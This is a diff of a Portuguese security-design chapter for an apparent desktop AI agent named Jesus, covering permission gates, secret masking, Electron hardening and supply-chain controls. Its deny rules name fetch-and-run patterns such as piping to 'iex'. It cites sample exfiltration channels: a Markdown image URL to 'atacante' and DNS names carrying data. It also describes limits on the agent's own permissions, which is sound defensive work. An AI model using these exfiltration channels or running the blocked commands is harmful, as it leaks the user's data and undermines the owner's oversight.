@@ -217,7 +217,8 @@ Sintaxe proposta, inspirada no Claude Code: `ferramenta(especificador)`. Para co
   "deny": [
     "arquivo.*(~/.ssh/**)",
     "arquivo.*(**/*.kdbx)",
-    "arquivo.*(%LOCALAPPDATA%/Jesus/**)",
+    "arquivo.*(%LOCALAPPDATA%/Jesus/**)",          // dados: senha local, cofre, banco
+    "arquivo.*(%LOCALAPPDATA%/Programs/Jesus/**)", // instalação: o próprio app (inclui resources/)
     "terminal(*Set-ExecutionPolicy*)",
     "terminal(* | iex*)",
     "gmail.criar_filtro(*)"
@@ -265,6 +266,13 @@ Uma negação em qualquer nível vence uma liberação em qualquer outro (igual 
 - Edições dentro das pastas liberadas → executa com checkpoint (exceto caminhos protegidos).
 - **Primeira leitura fora** das pastas liberadas → pergunta (igual ao Claude Code).
 - Leituras nas suas contas (listar eventos, listar e-mails) → executa, mas **ler o conteúdo de e-mails e páginas marca a tarefa como contaminada**.
+- **Na fase 1 ([decisão 0021](decisoes/0021-porteiro-minimo-para-leituras.md)):** só a leitura de arquivos existe, e o Porteiro é mínimo e determinístico (`packages/gate`). Ele confere duas vezes: o caminho pedido, só pelo texto, antes de o Executor abrir qualquer coisa (um caminho de rede nem é aberto); e o caminho real, o tipo e o número de nomes do arquivo, depois de aberto. Pasta do Jesus, leitura sensível (seção 3.4.3) e fora das pastas liberadas negam, pelo caminho pedido ou pelo real; hardlink nega. A primeira leitura fora das pastas liberadas também nega (a pergunta chega com os cartões de confirmação).
+- **As ferramentas de leitura ([decisão 0026](decisoes/0026-ferramentas-de-leitura-e-pastas-liberadas.md)):** `file_read`, `file_list` e `file_search`, no Executor (`packages/executor`).
+  - **Links:** antes de abrir, o Executor resolve os links nome a nome, sem deixar o sistema segui-los, e o Porteiro confere o alvo de cada um antes de ele ser tocado. Um link plantado para `\\servidor\pasta` (que no Windows mandaria a credencial do usuário ao servidor) nem é aberto.
+  - **Depois de abrir:** confere que o arquivo aberto é o conferido (`dev` e `ino`, também depois do `realpath` nativo).
+  - **Busca:** só literal; não segue links e para em cortes de níveis, itens, arquivos, bytes, resultados e tempo.
+  - **Liberar pasta:** só pelo diálogo nativo, com confirmação gerada por código. As pastas pessoais inteiras (Documentos, Downloads, Área de Trabalho, Imagens, Vídeos, Música) são recusadas; as subpastas delas podem. A lista passa de novo pelo Porteiro a cada abertura do app e fica vazia se o registro de auditoria não abrir saudável.
+  - **Onde roda:** no utilityProcess `jesus-executor`, sem rede (as travas do Cérebro). O principal confere cada chamada e passa o caminho pelo Porteiro antes de repassar, e grava no registro antes de rodar (sem registro, não roda).
 
 ### 3.4.5 Camada 3 — Classificador de risco
 
@@ -363,6 +371,13 @@ Uma negação em qualquer nível vence uma liberação em qualquer outro (igual 
 - Sem resposta → cancela.
 - "Sempre permitir" só existe para risco baixo e médio e fica escopado (projeto, ferramenta, padrão); **nunca** para alto.
 
+**Tela "Permissões" (pedido do dono do projeto):** toda permissão que você deu fica numa lista que você vê e remove quando quiser.
+
+- Cada linha mostra o que foi liberado (ex.: "abrir o VS Code"), o escopo (pasta, projeto ou sempre), quando e como você liberou (clique ou voz) e quantas vezes já foi usada.
+- **Remover vale na hora**, inclusive para uma tarefa em andamento: a próxima ação igual volta a pedir confirmação. Dá para remover uma a uma ou todas de uma vez ("voltar ao padrão").
+- Fica guardada em `regras_usuario` ([05](05-dados-postgresql.md), seção 5.5), com versões: dá para ver o histórico do que foi dado e tirado. A auditoria registra cada mudança.
+- **Só você mexe nela**, pela interface. O Jesus não dá nem amplia permissão para si mesmo (invariante 7). Ele pode só **abrir a tela** quando você pedir ("Jesus, mostra minhas permissões").
+
 **Fadiga de aprovação:** a própria Meta lembra que o modelo quebra quando o usuário aprova sem ler. Por isso: não pedir confirmação para o que é seguro, agrupar aprovações de baixo risco e deixar o cartão de alto risco visualmente diferente (âmbar ou vermelho, as únicas cores que o holograma usa).
 
 ### 3.4.8 Níveis de risco por domínio
@@ -420,14 +435,25 @@ O Jesus **nunca** faz o que está abaixo, mesmo que você peça, mesmo com todos
 ## 3.5 Credenciais, tokens e segredos
 
 - **Onde ficam:** chaves de API dos modelos e tokens OAuth ficam criptografados com o `safeStorage` do Electron (DPAPI no Windows) ou no Gerenciador de Credenciais. **Nunca** em texto puro, no PostgreSQL sem criptografia, em `.env` do repositório ou em variáveis de ambiente de processos que o agente controla.
+- **Cofre da fase 1 ([decisão 0020](decisoes/0020-cofre-da-chave-no-processo-principal.md)):** no processo principal, num arquivo da pasta de dados com cada valor cifrado pelo `safeStorage`. A chave da API entra só pela tela Configurações: a Server Action a passa ao principal pela ponte, sem guardar; a resposta diz só se há chave, nunca a chave. Só a chave de API comum (`sk-ant-apiNN-…`) é aceita; a de administrador é recusada. No Linux sem chaveiro do sistema, o cofre recusa (a cifra seria com uma senha conhecida). Gravação atômica e durável (`fsync` antes da troca de nome, com novas tentativas curtas quando o antivírus segura o arquivo); um cofre estragado vai para o lado quando o dono guarda ou apaga a chave de novo, sem travar nada. A âncora do registro de auditoria fica num arquivo cifrado próprio, regravado a cada linha, longe do arquivo da chave.
 - **Limite importante do DPAPI:** ele protege contra **outros usuários** do PC, mas **qualquer programa rodando como você** consegue pedir a descriptografia. A documentação do Electron diz isso explicitamente ([Electron safeStorage](https://electronjs.org/docs/latest/api/safe-storage)). Consequências: comandos do agente **não podem rodar como você no Windows** com acesso livre (por isso a sandbox da seção 3.6), e tokens devem ser de curta duração e revogáveis sempre que possível.
 - **Quem usa os tokens:** só o Executor. Ele injeta o token na chamada HTTP no último momento, o mesmo desenho do proxy de GitHub das sessões na nuvem do Claude Code. Nem a IA nem a sandbox veem o token.
-- **Mascarar segredos:** antes de mandar qualquer texto para um modelo, para o registro ou para a memória, um filtro procura e mascara padrões de segredo:
-  - chaves `sk-…`, `ghp_…`/`github_pat_…`, `AIza…`, `xox…`;
-  - JWTs e chaves privadas (`-----BEGIN … PRIVATE KEY-----`);
-  - strings de conexão.
+- **A chave da API dos modelos ([decisão 0023](decisoes/0023-cerebro-e-saida-para-a-api.md)):** o mesmo desenho, no processo principal. O Cérebro (`jesus-brain`) monta o pedido com uma chave de mentira e o entrega pela ponte. O principal confere o pedido (destino fixo, cabeçalhos e corpo em lista branca), lê a chave do cofre na hora, monta os cabeçalhos de saída do zero (a chave entra no pedido depois de criado, nunca nas opções que o Node imprime com `NODE_DEBUG`) e manda por um transporte que o ambiente não muda (autoridades fixas, sem proxy). A chave nunca chega ao Cérebro, ao ambiente dele, às mensagens da ponte, ao registro nem aos logs.
+- **Mascarar segredos:** antes de mandar qualquer texto para um modelo, para o registro, para os logs ou para a memória, um filtro procura e mascara padrões de segredo (`maskSecrets`, em `packages/shared`; [decisão 0022](decisoes/0022-registro-de-auditoria-e-mascaramento.md)):
+  - chaves `sk-…`/`sk-ant-…`, `ghp_…`/`ghs_…`/`github_pat_…`, `AIza…`/`GOCSPX-…`, `xox…`, AWS, Stripe, npm e outras com prefixo;
+  - `Bearer`, JWTs e chaves privadas (`-----BEGIN … PRIVATE KEY-----`);
+  - senha em string de conexão, senha por atribuição ou por proximidade de palavra-chave, códigos de verificação e de login, código de segurança e número de cartão (fica o final);
+  - tokens de alta entropia e base64 com barra (a chave secreta da AWS, o corpo de uma chave PEM visto sem o cabeçalho).
+  - É idempotente (mascarar de novo não muda nada), e o custo cresce em linha com o texto, mesmo com milhares de achados.
+  - **Arquivos lidos ([decisão 0026](decisoes/0026-ferramentas-de-leitura-e-pastas-liberadas.md)):**
+    - **leitura:** o Executor mascara o texto lido inteiro antes de mostrar qualquer pedaço, mantendo as quebras de linha;
+    - **busca:** compara com o texto já mascarado, para não virar oráculo do segredo;
+    - **nomes de arquivo:** passam só pelas regras de alta confiança (as heurísticas estragariam nomes comuns, e o nome mascarado não abre mais o arquivo). O logger também tira campos com nome de segredo (`password`, `token`, `cookie`…) inteiros.
+  - Na conversa ([decisão 0024](decisoes/0024-laco-da-conversa-no-cerebro.md)), a pergunta do dono é mascarada uma vez, ao entrar no histórico, e já sai mascarada para o modelo. O histórico fica só na memória do Cérebro e guarda só o texto das trocas, sem o raciocínio cifrado.
   - Se encontrar um segredo num parâmetro de ação com destino externo → **bloqueio**.
 - **Sua senha:** o Jesus nunca pede, guarda ou digita. O login é sempre você, na página oficial (OAuth).
+- **A senha do próprio Jesus** (para abrir o app, seção 3.20) é outra coisa: fica só como hash bcrypt e nunca é usada com nenhum provedor.
+- **Hash não é cifra.** O bcrypt serve para conferir senhas; o que precisa ser lido de volta (campos sensíveis, backups) é cifrado com AES-256-GCM, com a chave protegida pelo cofre ([decisão 0015](decisoes/0015-senha-local-com-bcrypt-e-dados-cifrados.md)).
 - **`.env`:** pode ser liberado por projeto, mas o Executor injeta os valores nos processos da sandbox que precisarem. **O modelo vê só os nomes** das variáveis.
 - **Rotação e revogação:** o botão "desconectar" revoga o token na API do provedor e apaga do cofre. Num incidente, "revogar tudo" com um clique (seção 3.18).
 
@@ -489,7 +515,7 @@ appendWindowsPath = false
 - **Pacotes:**
   - instalar o que já está no lockfile ou manifesto = médio;
   - pacote novo = pergunta, mostrando nome, versão, autor e data de publicação, com alerta para pacotes muito novos ou com nome parecido com outro (*typosquatting*);
-  - preferir `npm ci` ou `pnpm install --frozen-lockfile`;
+  - preferir `npm ci` (ou o equivalente com lockfile congelado do gerenciador do projeto);
   - scripts de instalação desligados por padrão quando possível.
 - **Sombreamento de módulo (caso Rehberger):** a sandbox não executa nada a partir da pasta de downloads ou de pastas com arquivos recém-baixados; Python roda com `-I` (modo isolado), e o diretório de trabalho de scripts é o do projeto.
 - **Rede:** cada comando declara os domínios de que precisa (ex.: `registry.npmjs.org`), e o Porteiro avalia isso junto com o comando, como no Claude Code. No modo padrão, o controle é só do Porteiro (comando com rede pergunta). No AppContainer (upgrade), a rede fica fechada sem a capacidade `internetClient`; no WSL2, fica fechada e abre por lista de domínios via proxy.
@@ -519,7 +545,7 @@ appendWindowsPath = false
 - **Criptografia em repouso:** ligar a criptografia do dispositivo/BitLocker no Windows; campos muito sensíveis criptografados pela aplicação (AES-256-GCM, chave no cofre); backups criptografados.
 - **O que vai para a nuvem:** só o necessário para a tarefa vai para o provedor de IA. Política por categoria: dados de saúde, documentos pessoais e finanças vão **só para modelo local** (Ollama) por padrão, ou para a nuvem com sua confirmação.
 - **Minimização:** o cérebro recebe trechos, não caixas de e-mail inteiras.
-- **Retenção:** você define por quanto tempo guardar conversas, resultados de ferramentas e registros. "Esquecer" apaga de verdade e sai dos backups seguintes.
+- **Retenção:** você define por quanto tempo guardar conversas, resultados de ferramentas e registros (o padrão das conversas é sem prazo, [decisão 0027](decisoes/0027-conversas-guardadas-sem-prazo.md)). "Esquecer" apaga de verdade e sai dos backups seguintes.
 - **Embeddings também são dados pessoais:** vetores podem vazar informação do texto original, então recebem a mesma proteção.
 - **Provedores:** escolha provedores e planos cujas políticas de uso e retenção de dados você aceita, e confira a política de cada um.
 
@@ -549,8 +575,34 @@ Seguir a lista oficial de segurança do Electron ([Electron Security](https://el
 - CSP restritiva (`script-src 'self'`), sem `eval`; nenhum conteúdo remoto nas janelas do app.
 - Bloquear navegação e novas janelas; `shell.openExternal` só para URLs de uma lista (ex.: páginas de login OAuth).
 - Validar a origem de toda mensagem IPC.
-- Markdown vindo do modelo é renderizado com sanitização e **sem carregar imagens remotas** sozinho. Esse é um canal clássico de vazamento: `![x](https://atacante/?dados=…)`.
-- Protocolo próprio (`app://`) em vez de `file://`.
+- Markdown vindo do modelo é renderizado com sanitização e **sem carregar imagens remotas** sozinho. Esse é um canal clássico de vazamento: `![x](https://atacante/?dados=…)`. Na fase 1, a resposta é só texto puro, sem Markdown nem links clicáveis ([decisão 0025](decisoes/0025-tela-de-conversa.md)).
+- Protocolo próprio em vez de `file://`: a janela carrega `https://jesus.invalid/`, um endereço que não existe na internet, atendido pelo `protocol.handle` do Electron (decisão 0016).
+- **Interface em Next.js com servidor ([decisão 0016](decisoes/0016-nextjs-com-servidor-dentro-do-electron.md), que substitui a exportação estática da 0013):** páginas, Server Actions e rotas são o back-end da interface, mas **o app instalado não abre porta**: o Electron entrega ao servidor do Next, dentro do próprio app, só os pedidos da janela do Jesus para `https://jesus.invalid/` e recusa qualquer outro endereço. Outros programas e sites não alcançam esse back-end.
+  - **Lista de `Host`** (`src/server/host.ts`): o proxy responde 421 a qualquer pedido cujo `Host` (ou `X-Forwarded-Host`) não seja `127.0.0.1`, `localhost`, `[::1]` ou `jesus.invalid`, antes de qualquer página ou ação. É a defesa contra *DNS rebinding* no servidor com porta (desenvolvimento e `next start`): nesse ataque, `Origin` e `Host` trazem o nome do site do atacante e batem entre si, então a checagem de origem do Next sozinha não basta. O proxy confere todo pedido, menos os arquivos de `/_next/static/`; não há exceção por cabeçalho (um pedido com `next-router-prefetch` também passa pela lista). No app instalado (`JESUS_HTTPS=1`), a lista fica só com `jesus.invalid`.
+  - **Processo próprio ([decisão 0017](decisoes/0017-servidor-do-next-num-utilityprocess.md)):** o servidor do Next roda no utilityProcess `jesus-next`. Ele só fala com o principal por uma ponte de mensagens conferidas com Zod estrito: pedido de até 2 MB, só `https://jesus.invalid`, só GET, HEAD e POST, e resposta com contrapressão.
+    - Sem rede: o `fetch` falha fechado, menos o repasse interno de Server Action do próprio Next, atendido em memória.
+    - Se o processo cair, o pedido em andamento é interrompido (nunca chega pela metade como se estivesse inteiro), e o processo novo começa bloqueado.
+    - A montagem do build para o app (`stage-ui.mjs`) recusa `.env*`, a pasta `.jesus-dev`, credenciais, chaves, bancos e módulos nativos.
+    - Limite: o utilityProcess não tem a sandbox do Chromium. A separação protege contra travamento e vazamento por acidente, não contra execução de código no processo do Next.
+  - **CSP com nonce novo a cada pedido** (`src/proxy.ts`): `script-src 'self' 'nonce-…' 'strict-dynamic'` e estilos com o mesmo nonce, sem `unsafe-inline`; `unsafe-eval` só no desenvolvimento. Mais `X-Frame-Options: DENY`, `nosniff`, `no-referrer` e `Permissions-Policy`. O Zod roda sem JIT para não tentar `new Function`. As telas de 404 e de erro geral são do próprio app (`app/not-found.tsx`, `app/global-error.tsx`), só com classes CSS: as padrão do Next usam estilos inline, que a CSP bloqueia. O teste no Chromium não acusou violação nas telas de entrada, início, Cenários, 404 e erro geral.
+  - **Server Actions são pontos de entrada:** só aceitam POST com a mesma origem (o Next confere `Origin` contra `Host`; o teste com origem falsa foi recusado e não contou tentativa), e cada uma valida a entrada com Zod e confere a sessão sozinha (até o "Bloquear": sem sessão válida, só apaga o cookie de quem chamou). Cada página protegida também confere (o layout não roda de novo a cada navegação). Em desenvolvimento, qualquer programa do PC alcança a porta local; no app instalado, só a janela do Jesus.
+  - **Tela de conversa e a primeira rota ([decisão 0025](decisoes/0025-tela-de-conversa.md)):** o turno vai por `POST /api/conversa/`, que manda a resposta em pedaços (as Server Actions não fazem isso). Uma rota não tem a checagem de origem das Server Actions, e o `SameSite=Strict` não olha a porta (no desenvolvimento, uma página em outra porta do `127.0.0.1` levaria o cookie). Por isso a rota confere sozinha: `Sec-Fetch-Site` e `Origin` quando vêm (no app, a janela não os manda), corpo JSON (outra origem não manda sem pedir licença, e a rota não dá), a sessão e o pedido com Zod estrito. O turno só segue enquanto a sessão vale (a cada pedaço e a cada segundo): bloqueou por qualquer motivo, o turno para e a tela vai para a entrada.
+  - **Sessão:** cookie `HttpOnly`, `SameSite=Strict` (e `Secure` no app em https), com 256 bits aleatórios; o servidor guarda só o SHA-256. Bloquear apaga a sessão. A página aberta confere a sessão a cada 30 s (ou um quarto do tempo sem uso, se for menor) e ao voltar a ficar visível, **sem contar como uso**; só tecla, clique ou rolagem de verdade contam. O tempo sem uso é medido por um relógio que nunca volta (o maior avanço entre o monotônico e o de parede).
+  - O back-end do Next é a camada da interface: não executa ferramentas nem guarda tokens de contas (Cérebro, Porteiro e Executor seguem em processos próprios, seção 2.2).
+  - A telemetria do Next fica desligada e o servidor de desenvolvimento só escuta em `127.0.0.1`. O Next 16 imprime no terminal os argumentos de cada Server Action (a senha, o código de recuperação e, depois, a chave da API): isso fica desligado no `next.config.ts` (`logging.serverFunctions: false`), com teste.
+- **App de desktop (fase 1, etapa 3; `apps/desktop/src/main/`):**
+  - **Janela:** uma só, sem preload (a página não fala com o processo principal na fase 1), com sandbox, sem `webview`, sem ferramentas de desenvolvedor e sem menu.
+  - **Sessão em memória:** a janela usa a partição `jesus` (sem `persist:`, nada vai para o disco). `https://jesus.invalid` vai para o servidor da interface; qualquer outro endereço, `http:` e `file:` recebem 403 do próprio app. A sessão padrão, que nenhuma janela usa, fica trancada do mesmo jeito.
+  - **Sem rede:** proxy morto (`socks5://0.0.0.0:9`, sem a exceção automática de localhost) nas duas sessões; WebRTC sem UDP direto e sem mDNS. **Nenhum nome resolve pelo Chromium** (`--host-resolver-rules=MAP * ~NOTFOUND`): a pré-resolução de DNS da página (`<link rel="dns-prefetch">`) não passa pelo proxy nem pela CSP e, sem a regra, levaria ao DNS do sistema um nome com dados (`<dados>.atacante.example`). A saída para a API da Anthropic sai pelo Node do processo principal, fora do Chromium ([decisão 0023](decisoes/0023-cerebro-e-saida-para-a-api.md)).
+  - **Nenhum ouvinte de `webRequest`:** no Electron 44.7.0, qualquer ouvinte faz a página depois de um 3xx herdar a CSP do 3xx. O handler tira a CSP das respostas 3xx (a página de destino traz a dela).
+  - **Cookies:** o `protocol.handle` não guarda cookies; o pote do processo principal guarda a sessão e nunca a entrega ao Chromium (o `document.cookie` da página fica vazio). Se o servidor da interface cair, o pote é limpo.
+  - **Negados:** permissões (câmera, microfone, localização, notificações…), dispositivos (HID, USB, serial, Bluetooth), captura de tela, downloads e o corretor (que baixaria dicionários).
+  - **Guardas:** navegação e redirecionamento só dentro do app; `window.open` negado; `webview` barrado. **Vigia de quadros:** um quadro com outra origem que chegue a carregar, ou a página principal fora de um endereço do app, derruba a sessão e volta a janela para a entrada, sempre (nenhuma violação é pulada). É a segunda barreira de verdade: um `iframe` `srcdoc` com sandbox (origem opaca) passa pela CSP e pela guarda de navegação, e a página principal levada para `about:blank` (por script ou `meta refresh`) herda a origem do app e não avisa antes; os testes conferem que o vigia pega os dois. Mais de 8 violações em 10 s fecham o app (disjuntor contra laço de recargas). Um `beforeunload` da página não segura nada (`will-prevent-unload` sempre liberado): sem isso, ele cancelaria a volta ao início pelo vigia e o fechamento da janela. A produção não guarda a lista de violações (só o registro, cortado), para a página não encher a memória do processo principal.
+  - **Linha de comando e ambiente:** o app de produção não aceita nenhum argumento (os fusíveis não cobrem `--remote-debugging-port`) nem as variáveis `ELECTRON_*` que o executável lê sozinho, antes de qualquer código do app (`ELECTRON_DISABLE_SANDBOX` desligaria a sandbox de todas as páginas). Aceita só as sem efeito e as das ferramentas de build (`src/main/policy/electron-environment.json`; o empacotamento confere que o executável não lê estas). O mesmo vale para as `NODE_*`, que o Node do processo principal lê ao iniciar (`NODE_DEBUG` imprimiria no stderr objetos internos, como as opções de cada conexão; `NODE_COMPILE_CACHE` carregaria código de fora do `app.asar`): só passam as que não mudam nada ali (`NODE_OPTIONS`, sem efeito com o fusível; as de autoridades e proxy, que o transporte ignora; `NODE_PATH`, `NODE_ENV` e as de aviso). Na produção, a sandbox fica sempre ligada. O build de teste, decidido na compilação (constante `__JESUS_TEST_BUILD__`), aceita argumentos, e o build de produção falha se sobrar código de teste nele.
+  - **Administrador:** no Windows, o app confere o nível de integridade (`whoami`) e não abre elevado; se não conseguir conferir, também não abre. O `whoami` vem da pasta do sistema resolvida pelo link do núcleo `\SystemRoot` (`\\?\GLOBALROOT\SystemRoot\System32`), nunca pela variável `SystemRoot`: o usuário pode redefini-la (HKCU\Environment), e o Jesus aberto como administrador rodaria elevado o `whoami` que ela apontasse. Só o build de teste (nunca publicado) registra e segue, porque os runners Windows do GitHub rodam como administrador; o teste de ponta a ponta no Windows confere que a conferência rodou.
+  - **Pasta de dados:** `%LOCALAPPDATA%\Jesus` (por máquina, como o Chromium). A `Roaming` (padrão do Electron) iria para o servidor do domínio num perfil móvel, com a credencial da senha e, depois, o banco.
+  - **CSP:** também `frame-src`, `child-src` e `worker-src 'none'`.
+  - **Testes de ponta a ponta:** o app de verdade no Electron 44.7.0, sob xvfb. No CI, com a sandbox do Chromium ligada (o teste confere o filtro seccomp no processo da página). Cobrem criar a senha e entrar, a aba Cenários com o holograma, a navegação e a janela para fora barradas, o 403, o proxy morto e o resolvedor sem nomes, as permissões negadas, as ferramentas de desenvolvedor desligadas, o vigia de quadros (também com um `beforeunload` na página), o bloqueio, a queda e volta do servidor da interface (bloqueado), a conversa (resposta em pedaços, Parar, Nova conversa e bloqueio no meio de uma resposta, com um destino de API local que só o build de teste tem) e a ausência de violação de CSP.
 - Cartões de confirmação num componente separado, que o conteúdo do modelo não consegue imitar.
 
 ## 3.13 Autoproteção
@@ -559,25 +611,40 @@ Seguir a lista oficial de segurança do Electron ([Electron Security](https://el
 - O registro de auditoria é **só de acréscimo** e encadeado por hash (cada linha guarda o hash da anterior). O usuário de banco do app não tem `UPDATE`, `DELETE` nem `TRUNCATE` nessa tabela.
 - Mudar o modo de permissão, liberar pasta, ampliar escopo ou editar regras: só pela interface, com confirmação física, e tudo fica registrado.
 - Atualizações do Jesus são assinadas e verificadas; o agente nunca se atualiza sozinho.
-- O Jesus não tem flag de linha de comando do tipo "pular permissões" (lição do caso Nx).
+- O Jesus não tem flag de linha de comando do tipo "pular permissões" (lição do caso Nx). O app de produção não aceita **nenhum** argumento, porque os fusíveis não cobrem `--remote-debugging-port`, nem as variáveis `ELECTRON_*` e `NODE_*` que mudam o executável ou o Node do principal (por exemplo, `ELECTRON_DISABLE_SANDBOX` e `NODE_DEBUG`), que um programa do PC poderia deixar gravadas no ambiente do usuário. Fica de fora uma lista curta das que não mudam nada (seção 3.12).
+- **Limite: `NODE_COMPILE_CACHE`.** Com essa variável e uma pasta de cache preparada, o Node do principal roda código de fora do `app.asar` antes de qualquer conferência do app, mesmo com os fusíveis (medido no Electron 44.7.0; [decisão 0023](decisoes/0023-cerebro-e-saida-para-a-api.md)). A recusa ao abrir pega o caso acidental, não o preparado: é o mesmo limite da pasta de instalação gravável, porque exige um programa rodando como o dono. Fica para acompanhar um fusível do Electron que desligue o cache e, na fase 3, a negação de comandos do agente que mudam variáveis do usuário (`setx`, `HKCU\Environment`).
+- **Fusíveis do Electron ([decisão 0018](decisoes/0018-empacotamento-com-electron-builder.md)):** o `.exe` de produção não roda como Node (`ELECTRON_RUN_AS_NODE`), ignora `NODE_OPTIONS` e `--inspect`, só carrega o app de dentro do `app.asar` e, no Windows, confere a integridade do asar. O empacotamento confere os fusíveis e abre o app para ver as recusas (`scripts/check-package.mjs`).
+- **Só módulos de dentro do `app.asar`:** a busca de módulos do Node sobe as pastas, e um `require` que não acha o módulo dentro do asar chegaria a `<instalação>/resources/node_modules`, fora da integridade (o Next tenta `@opentelemetry/api` assim, antes da cópia embutida). O servidor da interface trava a busca na raiz do app (`module.registerHooks`, `apps/desktop/src/next-host/module-scope.ts`); o processo principal não carrega módulo nenhum por nome (tudo está no bundle). O teste de ponta a ponta no pacote planta um módulo ali e confere que ele não roda.
+- **Chaves do Next por processo:** a chave que cifra os valores capturados pelas Server Actions é aleatória a cada início do servidor da interface (`NEXT_SERVER_ACTIONS_ENCRYPTION_KEY`), e não a do build, que vai igual em todo `.exe` publicado. As chaves de pré-visualização do build ficam: nada no app usa o modo de rascunho, e a página não consegue pôr cookie (o pote do principal só guarda o que o servidor manda).
 
 ## 3.14 Cadeia de suprimentos
 
-- Fixar versões (lockfile) e revisar atualizações; `npm ci` ou `pnpm install --frozen-lockfile` no build.
-- Scripts de instalação desligados por padrão (`ignore-scripts`), liberados só para pacotes que precisam (ex.: módulos nativos) depois de revisar.
-- Dependabot ou Renovate + `pnpm audit`. Atualizar com um atraso proposital (ex.: esperar alguns dias depois que uma versão nova sai): pacotes sequestrados costumam ser removidos rápido.
+- Fixar versões (`package-lock.json`) e revisar atualizações; `npm ci` no build. **Todo PR que muda o lockfile tem o diff revisado** (pacotes novos, versões, `hasInstallScript`).
+- Scripts de instalação de dependências **nunca rodam por padrão** (`ignore-scripts=true` no `.npmrc`). Isso cobre também o que a política `allowScripts` do npm 11 sozinha não pega: scripts de dependências embutidas (`bundleDependencies`) e compilação nativa implícita (`binding.gyp`), testados em 08/10/2026. Pacote que precisa de script (módulo nativo, binário baixado) é revisado e liberado um a um, por versão: `npm approve-scripts <pacote>` grava a aprovação no `package.json`, e `npm rebuild <pacote> --ignore-scripts=false` roda só ele, barrado pelo `strict-allow-scripts` se não estiver aprovado. Passo a passo em `CLAUDE.md`.
+- Dependabot ou Renovate + `npm audit`. Atualizar com um atraso proposital, esperando alguns dias depois que uma versão nova sai: pacotes sequestrados costumam ser removidos rápido. No projeto, `min-release-age=3` no `.npmrc` vale sempre que o npm **escolhe** versões (`npm install <pacote>`, `npm update`, lockfile novo); o que já está no lockfile é instalado como está, por isso a revisão do diff.
+- Pacotes internos (`@jesus/*`) vêm só do workspace: o escopo aponta para um registry inexistente no `.npmrc`, contra confusão de dependências (o escopo `@jesus` no npm público não é nosso).
+- O npm não acusa import de pacote não declarado (dependência "fantasma"), como o pnpm acusava: a revisão confere que cada pacote declara o que importa.
 - Modelos baixados (voz, embeddings, LLM local): só de fontes oficiais, conferindo o hash.
+- **Prisma ([decisão 0014](decisoes/0014-prisma-como-orm.md)):** a CLI baixa sozinha um binário nativo (o *schema engine*) de `binaries.prisma.sh`, por fora do lockfile. O projeto evita isso no `prisma generate` (que não precisa dele) e no CI; só o `prisma migrate dev`, na máquina de quem desenvolve, usa o binário. O app instalado não leva a CLI: aplica as migrações em SQL com o migrador próprio. Os scripts de instalação do `prisma` e do `@prisma/engines` estão recusados em `allowScripts`.
+- **Next.js:** traz como dependência opcional o `sharp` (binários de imagem já compilados, sem script de instalação). O Jesus não usa otimização de imagem (`images.unoptimized`), então esses binários ficam instalados e parados.
 - Servidores MCP: versão fixada e hash das definições (seção 3.8).
+- **Empacotamento ([decisão 0018](decisoes/0018-empacotamento-com-electron-builder.md)):** o zip do Electron é conferido com o `checksums.json` do pacote `electron` (fixado no lockfile). Exceção registrada: no Windows, o electron-builder baixa o NSIS, os recursos do NSIS, o 7zip e o winCodeSign por fora do lockfile, cada um conferido por um SHA-256 fixo no código do `app-builder-lib`. O `electron-winstaller` (Squirrel, não usado) tem o script recusado em `allowScripts`. O `npm audit` acusa alertas moderados do `sprintf-js` na cadeia de download do electron-builder (ferramenta só de build). O build de teste tem identidade própria (`dev.jesus.desktop.test`, "Jesus (teste)") e nunca vira instalador: um instalador dele, com o appId do Jesus, substituiria a instalação de verdade por um app sem fusíveis.
+- **AI SDK ([decisão 0023](decisoes/0023-cerebro-e-saida-para-a-api.md)):** `ai` 7.0.142 e `@ai-sdk/anthropic` 4.0.81, versões exatas, só no Cérebro (vão no bundle). O `@ai-sdk/gateway` (que lê `AI_GATEWAY_API_KEY` e manda para a Vercel) é trocado no empacotamento por um substituto que recusa tudo; o build e a conferência do pacote falham se o código dele aparecer. O download de URLs do `@ai-sdk/provider-utils`, que carrega o `undici` por fora do `fetch`, fica desligado (download que recusa) e barrado pelas travas de módulo do Cérebro.
+- **Ações do GitHub fixadas pelo commit** (`uses: actions/checkout@<sha> # v5.1.0`), não pela tag, que pode ser movida: o job do Windows gera e publica o instalador, e uma ação comprometida o trocaria antes do upload (o SHA-256 do resumo é calculado no mesmo job e não pegaria). Para atualizar, conferir a tag nova e trocar o SHA à mão.
 - Build reproduzível no GitHub Actions; instalador assinado quando for distribuir.
 
 ## 3.15 Custos e limites (OWASP LLM10)
 
 - Orçamento diário e por tarefa (tokens e dinheiro), com alerta no holograma (anel de gasto).
+- **Teto do dia no processo principal ([decisão 0023](decisoes/0023-cerebro-e-saida-para-a-api.md)):** US$ 1 por dia por padrão; o dono muda o valor na tela Configurações (de US$ 0,01 a US$ 100,00), e a mudança só vale depois de gravada no registro de auditoria, que é a fonte do teto na abertura. Antes de cada pedido à API, o principal reserva o pior caso (cada byte do corpo como token gravado no cache, cada bloco de raciocínio devolvido pela saída máxima, que é como a API o cobra, e mais a saída inteira); o que não cabe na sobra do dia não sai. Depois, liquida pelo uso real lido da resposta. O gasto do dia é refeito pelo registro de auditoria ao abrir o app, e um pedido que caiu no meio conta pelo valor reservado inteiro; se o registro vai para o lado, o novo começa com o gasto e o teto do dia (`spend.carried`). Vale mesmo com o Cérebro comprometido pedindo sem parar, e pedido demais em pouco tempo derruba o Cérebro.
+- **Conversa ([decisão 0024](decisoes/0024-laco-da-conversa-no-cerebro.md)):** o limite de contexto vem do orçamento do modelo (uns 88,5 mil tokens no Haiku 5.5, abaixo da faixa de preço de 100 mil) e cada conversa tem no máximo 200 trocas; chegando lá, a tela pede uma conversa nova. O Cérebro não tenta de novo sozinho (`maxRetries: 0`): todo pedido passa pelo teto. O histórico não devolve blocos de raciocínio, que custariam entrada e 32 mil tokens de reserva cada.
 - Limites de passos, chamadas de ferramenta e tempo por tarefa.
 - Detecção de laço (a mesma ferramenta com os mesmos parâmetros repetida) → para.
 - **Botão de emergência:** atalho global + "Jesus, pare" → cancela o modelo, mata os comandos em execução e congela a fila.
 
 ## 3.16 Auditoria
+
